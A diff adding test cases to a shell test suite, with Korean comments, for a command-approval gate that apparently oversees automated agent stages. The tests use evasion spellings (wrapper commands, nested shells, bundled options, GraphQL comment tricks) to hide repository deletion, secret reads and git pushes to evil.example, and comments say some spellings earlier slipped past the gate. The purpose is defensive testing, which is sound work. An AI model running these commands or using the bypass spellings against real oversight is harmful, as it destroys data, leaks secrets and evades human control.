@@ -15136,6 +15136,42 @@ for rx57_w in 'env' 'env X=1' 'timeout 5' 'nice -n 5' 'nohup' 'stdbuf -oL' 'time
   check "57: 래퍼로 감싼 셸 페이로드의 하한이 저선언을 만든다 ($rx57_w)" "$rc" "6"
 done
 
+# 위임 래퍼 — 등급표가 안쪽 명령으로 등급하는 `command`·`lockf`·`find -exec` 는 공유
+# 풀기에 없어서, 등급만 안을 보고 불투명 분류·표지·하한·도달 필수는 바깥 단어를 읽었다.
+# `lockf` 는 무인 스킬이 문서 쓰기마다 요구하는 철자라 정직한 스테이지가 매일 쓴다.
+# 원 예시 옆 철자(옵션 순서·붙여 쓴 묶음·연쇄·다른 셸)를 함께 못박는다.
+for rx57_w in 'command' 'command -p' 'command --' 'lockf -k -t 0 /tmp/rx57.lock' 'lockf -t0 -k /tmp/rx57.lock' 'lockf /tmp/rx57.lock' 'env X=1 lockf /tmp/rx57.lock command'; do
+  # shellcheck disable=SC2086
+  rx exec 커밋 워크트리쓰기 런로컬 $rx57_w bash -c 'gh repo delete o/r --yes'
+  check "57: 위임 래퍼로 감싼 셸 페이로드의 하한이 저선언을 만든다 ($rx57_w)" "$rc" "6"
+done
+rx exec 커밋 워크트리쓰기 런로컬 lockf /tmp/rx57.lock sh -lc 'gh repo delete o/r --yes'
+check "57: lockf 안의 sh -lc 페이로드도 하한을 올린다" "$rc" "6"
+# 붙여 쓴 묶음은 풀기가 읽지 못한다 — 그때는 하한이 끝까지 올라 같은 거절이 선다.
+rx exec 커밋 워크트리쓰기 런로컬 lockf -kt0 /tmp/rx57.lock bash -c 'gh repo delete o/r --yes'
+check "57: 읽지 못하는 lockf 묶음은 하한을 끝까지 올린다" "$rc" "6"
+rx exec 커밋 워크트리쓰기 런로컬 find . -maxdepth 0 -exec bash -c 'gh repo delete o/r --yes' ';'
+check "57: find -exec 로 감싼 셸 페이로드의 하한이 저선언을 만든다" "$rc" "6"
+rx exec 커밋 워크트리쓰기 런로컬 find . -maxdepth 0 -execdir sh -c 'gh repo delete o/r --yes' +
+check "57: find -execdir … + 도 같다" "$rc" "6"
+# 둘째 실행 primary 는 첫 명령의 인자로 실려 아무도 읽지 않던 자리다.
+rx exec 커밋 워크트리쓰기 런로컬 find . -maxdepth 0 -exec true ';' -exec bash -c 'gh repo delete o/r --yes' ';'
+check "57: 둘째 -exec 의 셸 페이로드도 하한을 올린다" "$rc" "6"
+# 정직하게 올려 신고하면 불투명 상한이 받는다 — 원장에 워크트리 쓰기로 남지 않는다.
+rx_park "57: lockf 로 감싼 외부 행위는 올려 신고해도 불투명 상한에 걸린다" 신고등급한도 \
+  커밋 외부상태변경 런로컬 lockf -k -t 0 /tmp/rx57.lock bash -c 'gh repo delete o/r --yes'
+rx_park "57: command 로 감싼 비밀 출력이 park 된다" 비밀출력 \
+  커밋 읽기 dev command aws secretsmanager get-secret-value --secret-id db2
+# 대조군 — 위임할 것이 없는 형태와 정직한 문서 잠금 쓰기는 그대로다.
+rx plan 커밋 워크트리쓰기 런로컬 lockf -k -t 0 /tmp/rx57.lock printf x
+check "57: 잠금 안의 표 명령은 표가 증명한 등급으로 통과한다 (대조군)" "$rc" "0"
+rx plan 커밋 트리밖쓰기 런로컬 lockf -k -t 0 /tmp/rx57.lock bash -c 'printf x >> /tmp/rx57.doc'
+check "57: 잠금 안의 셸 쓰기는 도달을 신고하면 통과한다 (대조군)" "$rc" "0"
+rx plan 커밋 읽기 런로컬 command -v git
+check "57: command -v 는 읽기로 남는다 (대조군)" "$rc" "0"
+rx plan 커밋 읽기 런로컬 find . -maxdepth 1 -name '*.sh'
+check "57: 실행 primary 없는 find 는 읽기로 남는다 (대조군)" "$rc" "0"
+
 rx_park "57: env 로 감싼 비밀 출력이 park 된다" 비밀출력 \
   커밋 읽기 dev env aws secretsmanager get-secret-value --secret-id db
 
@@ -15205,6 +15241,16 @@ rx_park "58: 협업 적대 — 허용 이름과 병합이 섞인 문서" 도달�
   커밋 외부상태변경 협업 gh api graphql -f 'query=mutation { addComment(input: {subjectId: "X", body: "b"}) { clientMutationId } m: mergePullRequest(input: {pullRequestId: "X"}) { clientMutationId } }'
 rx_park "58: 협업 적대 — 연산 이름을 허용 이름으로 지은 병합" 도달모순 \
   커밋 외부상태변경 협업 gh api graphql -f 'query=mutation addComment { mergePullRequest(input: {pullRequestId: "X"}) { clientMutationId } }'
+# 필드 이름과 괄호 사이의 무시 토큰 — GraphQL 은 개행·쉼표·주석을 건너뛰는데 추출은
+# 한 줄 안의 공백만 보았다.
+rx_park "58: 협업 적대 — 이름과 괄호 사이의 개행" 도달모순 \
+  커밋 외부상태변경 협업 gh api graphql -f $'query=mutation { addComment(input: {subjectId: "X", body: "b"}) { clientMutationId } mergePullRequest\n(input: {pullRequestId: "X"}) { clientMutationId } }'
+rx_park "58: 협업 적대 — 이름과 괄호 사이의 쉼표" 도달모순 \
+  커밋 외부상태변경 협업 gh api graphql -f 'query=mutation { addComment(input: {subjectId: "X", body: "c"}) { clientMutationId } mergePullRequest ,(input: {pullRequestId: "X"}) { clientMutationId } }'
+rx_park "58: 협업 적대 — 이름과 괄호 사이의 주석" 도달모순 \
+  커밋 외부상태변경 협업 gh api graphql -f $'query=mutation { addComment(input: {subjectId: "X", body: "d"}) { clientMutationId } mergePullRequest #c\n(input: {pullRequestId: "X"}) { clientMutationId } }'
+rx plan 커밋 외부상태변경 협업 gh api graphql -f $'query=mutation {\n  addComment(input: {subjectId: "X", body: "a # b, (c)"}) {\n    clientMutationId\n  }\n}'
+check "58: 협업 허용 — 여러 줄 문서와 문자열 안의 주석·쉼표 (대조군)" "$rc" "0"
 rx_park "58: 협업 적대 — 로컬 동사인 gh pr checkout" 도달모순 \
   커밋 워크트리쓰기 협업 gh pr checkout 1
 
@@ -15239,6 +15285,35 @@ rx_park "58: 기기전역" 기기전역 \
 rx_park "58: dev파괴" dev파괴 \
   커밋 외부상태변경 dev curl -X DELETE https://example.invalid/x
 
+# REST 머지 — 사다리가 원시 경로를 글롭하는 동안 쿼리를 붙인 머지는 협업 판정에는 머지,
+# 사다리에는 아무것도 아니었다. 커밋으로 신고한 머지는 저신고(exit 8)로 서야 한다.
+for rx58_m in 'repos/o/r/pulls/1/merge?merge_method=squash' 'repos/o/r/pulls/1/merge/' 'https://api.github.com/repos/o/r/pulls/1/merge'; do
+  rx plan 커밋 외부상태변경 협업 gh api -X PUT "$rx58_m"
+  check "58: REST 머지는 경로 철자와 무관하게 머지 단을 유도한다 ($rx58_m)" "$rc" "8"
+done
+rx plan 커밋 외부상태변경 협업 gh api -iXPUT repos/o/r/pulls/1/merge
+check "58: 묶음 철자의 REST 머지도 머지 단을 유도한다" "$rc" "8"
+rx plan 커밋 외부상태변경 협업 gh api -X PUT 'repos/o/r/pulls/1/comments?x=merge'
+check "58: 쿼리에 merge 가 든 코멘트 경로는 머지가 아니다 (대조군)" "$rc" "0"
+
+# branch 배포트리거 — 번호로 부른 PR 머지는 기반 브랜치를 argv 에 싣지 않는다.
+rx_new RX58B " | 배포트리거 식별자=branch:main"
+rx58b_trig() {
+  ( cd "$WT" && CC_GATE_SOURCE_ONLY=1 bash -c '
+      . "'"$GATE"'"; unset CC_GATE_SOURCE_ONLY CC_ORCH_SOURCE_ONLY
+      MANIFEST="'"$RX_M"'"
+      set +e
+      if gate_deploy_trigger_match infra "$@"; then printf 1; else printf 0; fi' _ "$@" ) 2>/dev/null
+}
+check "58: branch 트리거 대상에서 gh pr merge <번호> 는 배포트리거다" "$(rx58b_trig gh pr merge 5 --squash)" "1"
+check "58: gh -R 뒤의 gh pr merge 도 같다" "$(rx58b_trig gh -R o/r pr merge 5)" "1"
+check "58: URL 로 부른 gh pr merge 도 같다" "$(rx58b_trig gh pr merge https://github.com/o/r/pull/5)" "1"
+check "58: REST 머지도 같다" "$(rx58b_trig gh api -X PUT repos/o/r/pulls/5/merge)" "1"
+check "58: PR 코멘트는 배포트리거가 아니다 (대조군)" "$(rx58b_trig gh pr comment 5 --body b)" "0"
+check "58: 다른 브랜치로의 push 는 배포트리거가 아니다 (대조군)" "$(rx58b_trig git push origin seg)" "0"
+rx_new RX58C ""
+check "58: branch 트리거가 없는 대상에서는 PR 머지가 배포트리거가 아니다 (대조군)" "$(rx58b_trig gh pr merge 5 --squash)" "0"
+
 CC_CMDS_AUTOPILOT_AUTO_RESOLVE="$CC_GATE_PREV_AR58"
 
 # ---------------------------------------------------------------------------
@@ -15259,6 +15334,25 @@ graded_as 외부상태변경 '59: gh api --input= 는 본문이다' -- gh api re
 graded_as 외부상태변경 '59: docker build --push 는 외부 상태 변경이다' -- docker build --push -t r/a:prod .
 graded_as 외부상태변경 '59: docker stack deploy 는 외부 상태 변경이다' -- docker stack deploy -c s.yml app
 graded_as '등급 미상' '59: docker 가 모르는 동사는 등급 미상이다' -- docker frobnicate
+# gh api 짧은 옵션 — pflag 는 한 단어를 글자 단위로 읽는다.
+graded_as 외부상태변경 '59: gh api -iFbody= 묶음은 본문이다' -- gh api -iFbody=x repos/o/r/issues
+graded_as 외부상태변경 '59: gh api -iF 뒤 단어도 본문이다' -- gh api -iF body=x repos/o/r/issues
+graded_as 외부상태변경 '59: gh api -F=값 은 본문이다' -- gh api -F=body=x repos/o/r/issues
+graded_as 읽기 '59: gh api -i 만 붙인 조회는 읽기다 (대조군)' -- gh api -i repos/o/r
+graded_as '형태 미상' '59: gh api 가 모르는 짧은 옵션 글자는 형태 미상이다' -- gh api -iZ repos/o/r
+graded_as '형태 미상' '59: gh api 가 보내지 않는 메서드는 형태 미상이다' -- gh api -X FROB repos/o/r
+# docker 레지스트리 push 철자.
+graded_as 외부상태변경 '59: docker --push=true 는 외부 상태 변경이다' -- docker buildx build --push=true .
+graded_as 외부상태변경 '59: docker -o type=registry 는 외부 상태 변경이다' -- docker buildx build -o type=registry,name=r/i .
+graded_as 외부상태변경 '59: docker -otype=registry 는 외부 상태 변경이다' -- docker buildx build -otype=registry .
+graded_as 외부상태변경 '59: docker --output=type=registry 는 외부 상태 변경이다' -- docker build --output=type=registry .
+graded_as 외부상태변경 '59: image 내보내기의 push=true 는 외부 상태 변경이다' -- docker buildx build -o type=image,name=r/i,push=true .
+graded_as 외부상태변경 '59: bake --set 출력 지정도 외부 상태 변경이다' -- docker buildx bake --set '*.output=type=registry'
+graded_as 외부상태변경 '59: bake --set=*.push=true 도 외부 상태 변경이다' -- docker buildx bake --set=*.push=true
+graded_as 외부상태변경 '59: 전역 옵션 뒤의 --push=true 도 외부 상태 변경이다' -- docker -H x buildx build --push=true .
+graded_as 트리밖쓰기 '59: --push=false 는 로컬 쓰기다 (대조군)' -- docker buildx build --push=false .
+graded_as 트리밖쓰기 '59: type=local 내보내기는 로컬 쓰기다 (대조군)' -- docker buildx build -o type=local,dest=out .
+graded_as '형태 미상' '59: 모르는 내보내기 type 은 형태 미상이다' -- docker buildx build -o type=frob .
 
 rx_new RX59 "" 'gh api repos/o/r' 'git push'
 
@@ -15283,6 +15377,36 @@ rx_park "59: 인가된 형태의 --method=DELETE 는 파괴 형태를 명시하�
   커밋 외부상태변경 prod gh api --method=DELETE repos/o/r
 rx_park "59: 인가된 형태의 -XDELETE 도 같다" 파괴형태미명시 \
   커밋 외부상태변경 prod gh api repos/o/r -XDELETE
+# 짧은 옵션 묶음과 `=` — 글자 하나 옆의 철자가 저장소 삭제를 표 증명 읽기로 통과시켰다.
+rx_park "59: gh api -iXDELETE 묶음은 파괴다" dev파괴 \
+  커밋 외부상태변경 dev gh api -iXDELETE repos/o/r/labels/a
+rx_park "59: gh api -iX DELETE 는 다음 단어를 메서드로 읽는다" dev파괴 \
+  커밋 외부상태변경 dev gh api -iX DELETE repos/o/r/labels/b
+rx_park "59: gh api -X=DELETE 는 = 를 벗겨 파괴로 읽는다" dev파괴 \
+  커밋 외부상태변경 dev gh api -X=DELETE repos/o/r/labels/c
+rx_park "59: 인가된 형태의 -X=DELETE 도 파괴 형태를 명시하지 않았다" 파괴형태미명시 \
+  커밋 외부상태변경 prod gh api repos/o/r -X=DELETE
+rx_park "59: command 로 감싼 -iXDELETE 도 파괴다" dev파괴 \
+  커밋 외부상태변경 dev command gh api -iXDELETE repos/o/r/labels/d
+rx_park "59: env 로 감싼 -iXDELETE 도 파괴다" dev파괴 \
+  커밋 외부상태변경 dev env X=1 gh api -iXDELETE repos/o/r/labels/e
+rx exec 커밋 읽기 런로컬 bash -c 'gh api -iXDELETE repos/o/r'
+check "59: 셸 문자열 안의 -iXDELETE 가 하한을 올린다" "$rc" "6"
+rx exec 커밋 읽기 협업 gh api -iZ repos/o/r
+check "59: 모르는 짧은 옵션 글자는 선언으로 넘길 수 없다" "$rc" "2"
+# 표지 — 자원 앞의 옵션과 붙여 쓴 불리언.
+rx_park "59: kubectl get 앞의 -o 가 secret 을 가리지 않는다" 비밀출력 \
+  커밋 읽기 dev kubectl get -o yaml secret app
+rx_park "59: kubectl get -n 값 뒤의 secret 도 읽는다" 비밀출력 \
+  커밋 읽기 dev kubectl get -n ns -oyaml secrets app
+rx_park "59: command 로 감싼 kubectl secret 출력" 비밀출력 \
+  커밋 읽기 dev command kubectl get -o yaml secret app2
+rx_park "59: ssm --with-decryption=true 는 비밀 출력이다" 비밀출력 \
+  커밋 읽기 dev aws ssm get-parameter --name x --with-decryption=true
+rx plan 커밋 읽기 dev aws ssm get-parameter --name x --with-decryption=false
+check "59: ssm --with-decryption=false 는 비밀 출력이 아니다 (대조군)" "$rc" "0"
+rx plan 커밋 읽기 dev kubectl get -n secret pods -o yaml
+check "59: 네임스페이스 값의 secret 은 자원이 아니다 (대조군)" "$rc" "0"
 
 # 하한 — 셸 문자열이 감춘 명령 위치.
 for rx59_p in "gh repo delete o/r --yes" "if gh pr merge 5; then :; fi" "for i in 1; do gh pr merge 5; done" '"gh" pr merge 5' "curl -K cfg" 'eval "$X"'; do
@@ -15293,6 +15417,20 @@ rx exec 커밋 워크트리쓰기 런로컬 docker run --rm -v /h:/h alpine sh -
 check "59: docker run 이 실행할 명령이 하한을 올린다" "$rc" "6"
 rx plan 커밋 워크트리쓰기 런로컬 docker run --rm mysql
 check "59: 이미지 이름은 하한을 올리지 않는다 (대조군)" "$rc" "0"
+# 셸 문자열 안의 중첩 셸·리다이렉션·래퍼 — 최상위에서만 풀던 것들이 한 층 아래에서
+# 외부 행위를 숨겼다.
+for rx59_p in 'bash -c "gh repo delete o/r --yes"' '>/dev/null gh repo delete o/r --yes' '2>&1 gh repo delete o/r --yes' '> out.txt gh repo delete o/r --yes' '>&2 gh repo delete o/r --yes' 'time -p gh repo delete o/r --yes' 'nohup gh repo delete o/r --yes' 'echo o/r | xargs -n1 gh repo delete --yes' 'xargs -I{} gh repo delete {} --yes' 'sudo -u root gh repo delete o/r --yes' 'sudo -E gh repo delete o/r --yes' 'lockf -k -t 0 /tmp/l bash -c "gh repo delete o/r"' 'command -p gh repo delete o/r --yes' "sh -c \"bash -lc 'zsh -c gh repo delete o/r'\""; do
+  rx exec 커밋 워크트리쓰기 런로컬 bash -c "$rx59_p"
+  check "59: 셸 문자열 안의 명령 위치가 한 층 아래에서도 읽힌다 ($rx59_p)" "$rc" "6"
+done
+rx_park "59: 셸 문자열 안의 env 로 감싼 비밀 출력이 park 된다" 비밀출력 \
+  커밋 워크트리쓰기 런로컬 bash -c 'env aws secretsmanager get-secret-value --secret-id s1'
+rx_park "59: 셸 문자열 안의 command 로 감싼 비밀 출력도 같다" 비밀출력 \
+  커밋 워크트리쓰기 런로컬 bash -c 'command aws secretsmanager get-secret-value --secret-id s2'
+rx plan 커밋 읽기 런로컬 bash -c 'git status >/dev/null 2>&1'
+check "59: 리다이렉션이 붙은 읽기는 읽기로 남는다 (대조군)" "$rc" "0"
+rx plan 커밋 읽기 런로컬 bash -c 'grep "gh pr merge" f | xargs -n1 echo'
+check "59: 인자 속 명령 이름과 xargs echo 는 하한을 올리지 않는다 (대조군)" "$rc" "0"
 
 # docker 원격 데몬.
 rx_park "59: docker 원격 컨텍스트는 기기전역이다" 기기전역 \
@@ -15313,6 +15451,30 @@ rx_park "59: 해소되지 않는 원격은 불일치다" push원격불일치 \
   push 외부상태변경 협업 git push nosuchremote seg
 rx plan push 외부상태변경 협업 git push rx59good seg
 check "59: 선언된 원격으로의 push 는 통과한다 (대조군)" "$rc" "0"
+# 호스트 — 슬러그만 비교하던 동안 다른 호스트의 같은 경로가 일치였다.
+rx_park "59: 호스트가 다른 https URL 은 슬러그가 같아도 불일치다" push원격불일치 \
+  push 외부상태변경 협업 git push https://evil.example/t/infra.git seg
+rx_park "59: scp 형태의 다른 호스트도 불일치다" push원격불일치 \
+  push 외부상태변경 협업 git push git@evil.example:t/infra.git seg
+rx_park "59: ssh URL 의 다른 호스트도 불일치다" push원격불일치 \
+  push 외부상태변경 협업 git push ssh://git@evil.example/t/infra seg
+# URL 재작성 — 리터럴 URL 에도 git 이 insteadOf·pushInsteadOf 를 적용한다.
+# 명령줄의 `-c url.*` 는 등급표가 형태로 거부하므로, 원격 대조에 닿는 것은 저장소에
+# 영속된 설정이다.
+rx exec push 외부상태변경 협업 git -c url.https://evil.example/x/.insteadOf=https://github.com/t/ push https://github.com/t/infra.git seg
+check "59: -c 로 URL 을 재작성하는 push 는 형태 미상이다" "$rc" "2"
+(cd "$WT" && git config url.https://evil.example/y/.pushInsteadOf https://github.com/t/)
+rx_park "59: 저장소 설정의 pushInsteadOf 가 바꾸는 리터럴 URL 은 불일치다" push원격불일치 \
+  push 외부상태변경 협업 git push https://github.com/t/infra.git seg2
+(cd "$WT" && git config --unset url.https://evil.example/y/.pushInsteadOf) || true
+(cd "$WT" && git config url.https://evil.example/z/.insteadOf https://github.com/t/)
+rx_park "59: 저장소 설정의 insteadOf 가 바꾸는 리터럴 URL 도 불일치다" push원격불일치 \
+  push 외부상태변경 협업 git push https://github.com/t/infra.git seg3
+(cd "$WT" && git config --unset url.https://evil.example/z/.insteadOf) || true
+rx plan push 외부상태변경 협업 git push https://github.com/t/infra.git seg
+check "59: 선언된 호스트의 리터럴 URL 은 통과한다 (대조군)" "$rc" "0"
+rx plan push 외부상태변경 협업 git push git@github.com:t/infra.git seg
+check "59: 선언된 호스트의 scp 형태도 통과한다 (대조군)" "$rc" "0"
 (cd "$WT" && git remote remove rx59good >/dev/null 2>&1; git remote remove rx59bad >/dev/null 2>&1) || true
 
 # dev 식별자 — 킥오프가 묻는 두 종류가 조용히 꺼지지 않는다.
@@ -15336,7 +15498,7 @@ CC_CMDS_AUTOPILOT_AUTO_RESOLVE="$CC_GATE_PREV_AR59"
 # 처분 평가기는 룰을 탐침 모드로 불러 `P=… 형태=… Pd=…` 한 줄을 읽는다. 그 한 줄이
 # 매처 재작성의 전부인데 전용 단언이 없었다 — 접두 번짐이 되살아나도 알 수 없었다.
 pre_rx
-rx_new RX60 "" 'gh pr' 'npm' 'aws rds delete-db-instance' 'aws rds'
+rx_new RX60 "" 'gh pr' 'npm' 'aws rds delete-db-instance' 'aws rds' 'gh api repos/o/r'
 rx60_probe() {
   # rx60_probe <argv> [표지] [트리거]
   GATE_PREAUTH_PROBE=1 GATE_MARK="${2:-}" GATE_MARK_TRIGGER="${3:-}" GATE_ARGV="$1" GATE_MANIFEST="$RX_M" \
@@ -15351,6 +15513,48 @@ check "60: 형태가 파괴 단어를 담으면 파괴 명시다" \
   "$(rx60_probe 'aws rds delete-db-instance --db-instance-identifier x' 파괴 delete-db-instance)" "P=1 형태=완전 Pd=1"
 check "60: 형태가 다른 파괴 단어를 담지 않으면 파괴 명시가 아니다" \
   "$(rx60_probe 'aws rds delete-db-cluster --db-cluster-identifier x' 파괴 delete-db-cluster)" "P=1 형태=완전 Pd=0"
+# 매처는 `-*=*` 단어를 버린다. `-X=DELETE` 가 그 단어이므로 인가는 서고, 파괴 명시는
+# 서지 않는다 — 표지가 붙어야 prod 칸이 막는 이유가 이것이다.
+check "60: -X=DELETE 는 매처가 버리는 단어라 형태는 인가하되 파괴 명시가 아니다" \
+  "$(rx60_probe 'gh api repos/o/r -X=DELETE' 파괴 DELETE)" "P=1 형태=완전 Pd=0"
+
+# 스테이지가 신고하는 파괴 — `--destructive` 가 평가기의 파괴 입력으로 실제로 들어가는지를
+# exec·plan 수준에서 잰다. 매처 탐침만으로는 평가기가 그 값을 넘기는지 증명되지 않는다.
+CC_GATE_PREV_AR60="${CC_CMDS_AUTOPILOT_AUTO_RESOLVE:-}"
+CC_CMDS_AUTOPILOT_AUTO_RESOLVE=1
+rx_d() {
+  # rx_d <exec|plan> <표면> <도달> <argv...> — `rx` 에 --destructive 를 더한 것.
+  local verb="$1" surf="$2" reach="$3"; shift 3
+  gate "$verb" --manifest "$RX_M" --target infra --segment S1 --cutpoint 커밋 \
+    --surface "$surf" --reach "$reach" --destructive --snapshot-digest "$(RXH)" --rationale t -- "$@"
+}
+rx plan 커밋 외부상태변경 dev curl -X POST https://example.invalid/d60
+check "60: 파괴 신고 없는 dev 행위는 통과한다 (대조군)" "$rc" "0"
+rx60_n=$(rx_parks)
+rx_d exec 외부상태변경 dev curl -X POST https://example.invalid/d60
+check "60: 같은 행위에 --destructive 를 신고하면 dev 칸이 park 한다" "$rc" "11"
+check "60: 그 park 가 새 행으로 남는다" "$(rx_parks)" "$((rx60_n + 1))"
+check "60: 그 행의 판정이 dev파괴다" "$(rx_cell)" "dev파괴"
+
+rx_new RX60D "" 'terraform state rm module.db'
+rx plan 커밋 외부상태변경 prod terraform state rm module.db
+check "60: 파괴 단어를 담은 형태 아래의 파괴 행위는 prod 로 통과한다 (Pd=1 이 exec 경로에서 도달한다)" "$rc" "0"
+rx_new RX60E "" 'terraform state'
+rx_park "60: 파괴 단어 없는 형태 아래의 파괴 행위는 파괴형태미명시다" 파괴형태미명시 \
+  커밋 외부상태변경 prod terraform state rm module.db
+
+rx_new RX60F "" 'bash scripts/rotate.sh prod'
+rx plan 커밋 외부상태변경 prod bash scripts/rotate.sh prod
+check "60: 완전 형태로 인가된 스크립트는 prod 로 통과한다 (대조군)" "$rc" "0"
+rx_d exec 외부상태변경 prod bash scripts/rotate.sh prod
+check "60: 같은 스크립트에 --destructive 를 신고하면 park 한다" "$rc" "11"
+check "60: 그 판정이 파괴형태미명시다 (표지 없이 신고만으로)" "$(rx_cell)" "파괴형태미명시"
+
+rx_new RX60G "" 'bash'
+rx_d exec 외부상태변경 prod bash scripts/wipe.sh
+check "60: 러너만 적은 형태는 파괴 신고 행위의 상한을 풀지 않는다" "$rc" "11"
+check "60: 그 판정이 신고등급한도다" "$(rx_cell)" "신고등급한도"
+CC_CMDS_AUTOPILOT_AUTO_RESOLVE="$CC_GATE_PREV_AR60"
 
 # --- epilogue-begin ---
 #
